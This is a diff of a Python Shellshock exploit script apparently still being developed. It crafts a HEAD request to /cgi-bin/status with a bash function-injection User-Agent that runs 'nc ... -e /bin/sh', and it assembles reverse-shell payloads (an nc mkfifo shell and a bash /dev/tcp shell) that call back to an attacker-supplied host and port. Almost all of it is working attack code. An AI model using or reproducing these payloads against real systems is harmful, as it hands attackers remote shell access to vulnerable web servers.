@@ -4,31 +4,41 @@ import urllib.request
 import socket
 # Consists of the HEAD request which is sent in addition to the custom headers
 def shellshock_http_req(lhost, lport, rhost, rport, target_url):
-   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-   # Connet to this socket
-   sock_connect = s.connect((rhost, rport))
+   #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   # Connet a socket to the target running cgi-bin
+   #sock_connect = s.connect((rhost, rport))
 
    ''' HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" '''
-   # The sendall function sends the data we need. It's needed to encode the variables before inserting otherwise they're treated like a string
-   rhost_encoded = rhost.encode()
+   # The sendall function sends the data we need. It's needed to encode the variables before inserting otherwise they're treated like a string. Encoding the data helps with the data being sent as bytes
+   rhost_encoded = rhost.encode() 
    lhost_encoded = lhost.encode()
+   #rev_payload = shellshock_rev_payloads(lhost_encoded, lport)
    #lport_encoded = lport.encode()
    #s.sendall(b"GET / HTTP1.1\r\nHost: 192.168.0.100\r\n\r\n")
    #s.sendall(b"GET / HTTP 1.1\r\nHost: %s\r\n\r\n" % rhost)
    #s.sendall(b"GET / HTTP 1.1\r\nHost: %s\r\n\r\n" % rhost_encoded)
    # This request requires appropriate encoding of each parameter which gets added and these parameters need to be placed into a tuple of their own in which you can then place more than one formatting argument
-   payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded))
-   
+   #payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded))
+   payload = print(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded))
+   # Proof of concept payload in which reverse payloads are arbitrary and not declared statically in the socket
+   #payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (rev_payload, rhost_encoded))
+   #payload = print(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (rev_payload, rhost_encoded))
+   # Payload needs to be added in accordance with the for loop of several payloads. A single variable of payload should be expected which should fulfil the conditions of all required parameters as part of the HEAD request and user agent modification   
+
    ''' Don't even need the recv data because the data isn't even coming back to the program... We just fire the payload off that's it '''
    #recv_data = s.recv(4096)
-   sys.exit("Sent payload, dipping out lol")
+   #sys.exit("Sent payload, aight imma head out")
    '''
    Need a way to find out if the socket connected successfully or not and then inform the user
    '''
-   s.close()
 
+   # Socket is closed
+   #s.close()
+
+   return payload
 ''' Paste in the URL from the shellshock_dect tool '''
-def shellshock_rev_payloads(lhost, lport, target_url):
+def shellshock_rev_payloads(lhost, lport):
+#def shellshock_rev_payloads(lhost, lport, target_url):
     ''' WE DON'T NEED TO CRAFT ANYMORE URLs!!! Because, we already have the one we're looking for; we just need to work with it '''
     ''' This is just a text value, no network ops happening '''
     reverse_payloads = []
@@ -40,9 +50,11 @@ def shellshock_rev_payloads(lhost, lport, target_url):
     with full PTY support unlike /bin/sh and other capabilities if we want'''
     ''' New netcat '''
     reverse_payload_2 = "rm /tmp/f;mkfifo  /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc {} {}".format(lhost, lport)
+    reverse_payload_3 = "bash -i >& /dev/tcp/{}/{} 0>&1".format(lhost, lport)
     reverse_payloads.append(reverse_payload_1)
     reverse_payloads.append(reverse_payload_2)
-    word_response = requests.get(target_url).status_code
+    reverse_payloads.append(reverse_payload_3)
+    #word_response = requests.get(target_url).status_code
     return reverse_payloads
 
 def main():
@@ -58,7 +70,11 @@ def main():
     payload = shellshock_http_req(lhost,lport,rhost, rport, target_url)
     #Just a GET request ATM. Needs to have a socket attached
     #result = shellshock_rev_payloads(lhost, lport, target_url)
-    #for rev_payload in result:
+    result = shellshock_rev_payloads(lhost, lport)
+    print("List of payloads to inject")
+    for rev_payload in result:
+        #print(payload)
+        print(rev_payload)
     ''' 
     The payloads should cycle from 1 - ... here until one payload connects back to us 
     Create sockets back to us which contain the payloads
